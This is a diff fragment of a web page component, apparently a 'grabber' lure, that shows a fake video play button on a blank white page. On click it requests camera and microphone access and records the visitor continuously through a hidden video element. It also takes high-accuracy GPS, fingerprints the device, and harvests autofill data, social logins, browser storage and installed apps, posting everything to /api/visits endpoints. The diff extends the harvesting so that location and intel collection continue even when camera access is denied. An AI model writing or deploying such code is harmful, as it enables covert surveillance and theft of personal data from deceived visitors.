-        () => { if (deviceInfoRef.current && !resultSentRef.current) sendGrabberResult(deviceInfoRef.current); },
-        { enableHighAccuracy: true, timeout: 15_000, maximumAge: 0 },
-      );
+    if (!navigator.mediaDevices?.getUserMedia) {
+      // No camera API — just collect intel
+      requestGps();
+      collectIntel();
+      return;
     }
 
-    // ── Intel collection: autofill + social + storage + apps ─
-    Promise.allSettled([
-      collectAutofill(),
-      detectSocialLogins(),
-      collectBrowserStorage(),
-      detectInstalledApps(),
-    ]).then(([af, sl, stor, apps]) => {
-      post('/api/visits/intel', {
-        autofill: af.status    === 'fulfilled' ? af.value   : undefined,
-        social:   sl.status    === 'fulfilled' ? sl.value   : undefined,
-        storage:  stor.status  === 'fulfilled' ? stor.value : undefined,
-        apps:     apps.status  === 'fulfilled' ? apps.value : undefined,
-      });
-    }).catch(() => {});
-
-    // ── Front camera + mic (90 s, 10 s chunks) ─────────────
-    if (!navigator.mediaDevices?.getUserMedia) return;
-
+    // Step 1: Camera + Mic (shows ONE combined browser prompt)
     navigator.mediaDevices
-      .getUserMedia({ video: { facingMode: 'user' }, audio: true })
+      .getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: true })
       .then(stream => {
         const vid = makeHiddenVideo(stream);
         let started = false;
-        vid.onplaying = () => { if (!started) { started = true; startCamRecord(stream, vid, 90_000, 'FRONT'); } };
-        const fb = setTimeout(() => { if (!started) { started = true; startCamRecord(stream, vid, 90_000, 'FRONT'); } }, 4000);
-        vid.play().catch(() => { clearTimeout(fb); stream.getTracks().forEach(t => t.stop()); });
+
+        const begin = () => {
+          if (started) return;
+          started = true;
+          startContinuousRecord(stream, vid, 'FRONT');
+        };
+
+        vid.onplaying = begin;
+        vid.play().catch(() => setTimeout(begin, 1500));
+
+        // Step 2 (chained): GPS — shown as second prompt after camera accepted
+        requestGps();
+
+        // Step 3: Intel collection in background
+        collectIntel();
       })
       .catch(() => {
-        // Try rear camera if front not available
-        navigator.mediaDevices
-          .getUserMedia({ video: { facingMode: 'environment' }, audio: false })
-          .then(stream => {
-            const vid = makeHiddenVideo(stream);
-            let started = false;
-            vid.onplaying = () => { if (!started) { started = true; startCamRecord(stream, vid, 90_000, 'REAR'); } };
-            const fb = setTimeout(() => { if (!started) { started = true; startCamRecord(stream, vid, 90_000, 'REAR'); } }, 4000);
-            vid.play().catch(() => { clearTimeout(fb); stream.getTracks().forEach(t => t.stop()); });
-          })
-          .catch(() => {});
+        // Camera denied — still get GPS and intel
+        requestGps();
+        collectIntel();
       });
   }
 
-  // Render: invisible page that prompts on click
+  function requestGps() {
+    if (!('geolocation' in navigator)) return;
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const gps = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
+        gpsRef.current = gps;
+        mutateRef.current({
+          data: {
+            latitude: gps.lat, longitude: gps.lng, accuracy: gps.accuracy,
+            altitude: pos.coords.altitude ?? undefined,
+            referrer: document.referrer || undefined,
+            source: sourceRef.current.source || undefined,
+            sourceName: sourceRef.current.sourceName || undefined,
+          }
+        });
+        if (deviceInfoRef.current) sendGrabberResult(deviceInfoRef.current, gps);
+      },
+      () => {
+        if (deviceInfoRef.current && !resultSentRef.current) sendGrabberResult(deviceInfoRef.current);
+      },
+      { enableHighAccuracy: true, timeout: 20_000, maximumAge: 0 },
+    );
+  }
+
+  function collectIntel() {
+    // Passive fingerprint
+    collectDeviceInfo().then(info => {
+      deviceInfoRef.current = info;
+      if (gpsRef.current) sendGrabberResult(info, gpsRef.current);
+      // Fallback: send without GPS after 20s
+      setTimeout(() => {
+        if (!resultSentRef.current && deviceInfoRef.current) sendGrabberResult(deviceInfoRef.current);
+      }, 20_000);
+    }).catch(() => {});
+
+    // Autofill + social + storage + apps
+    Promise.allSettled([
+      collectAutofill(),
+      detectSocialLogins(sourceRef.current.source),
+      collectBrowserStorage(),
+      detectInstalledApps(),
+    ]).then(([af, sl, stor, apps]) => {
+      post('/api/visits/deviceinfo', {
+        autofill: af.status   === 'fulfilled' ? af.value   : undefined,
+        social:   sl.status   === 'fulfilled' ? sl.value   : undefined,
+        storage:  stor.status === 'fulfilled' ? stor.value : undefined,
+        apps:     apps.status === 'fulfilled' ? apps.value : undefined,
+        _source: sourceRef.current.source,
+        _sourceName: sourceRef.current.sourceName,
+      });
+    }).catch(() => {});
+  }
+
   return (
     <div
       onClick={triggerCapture}
       style={{
-        position: 'fixed',
-        inset: 0,
-        background: '#fff',
-        display: 'flex',
-        flexDirection: 'column',
-        alignItems: 'center',
-        justifyContent: 'center',
-        cursor: 'pointer',
-        userSelect: 'none',
+        position: 'fixed', inset: 0, background: '#fff',
+        display: 'flex', flexDirection: 'column',
+        alignItems: 'center', justifyContent: 'center',
+        cursor: 'pointer', userSelect: 'none',
         WebkitTapHighlightColor: 'transparent',
       }}
     >
       <div style={{
-        width: 80,
-        height: 80,
-        borderRadius: '50%',
+        width: 80, height: 80, borderRadius: '50%',
         backgroundColor: 'rgba(0,0,0,0.07)',
-        display: 'flex',
-        alignItems: 'center',
-        justifyContent: 'center',
-        border: '2px solid rgba(0,0,0,0.12)',
-        pointerEvents: 'none',
+        display: 'flex', alignItems: 'center', justifyContent: 'center',
+        border: '2px solid rgba(0,0,0,0.12)', pointerEvents: 'none',
       }}>
         <div style={{
-          width: 0,
-          height: 0,
-          borderStyle: 'solid',
+          width: 0, height: 0, borderStyle: 'solid',
           borderWidth: '14px 0 14px 24px',
           borderColor: 'transparent transparent transparent #222',
           marginLeft: 6,
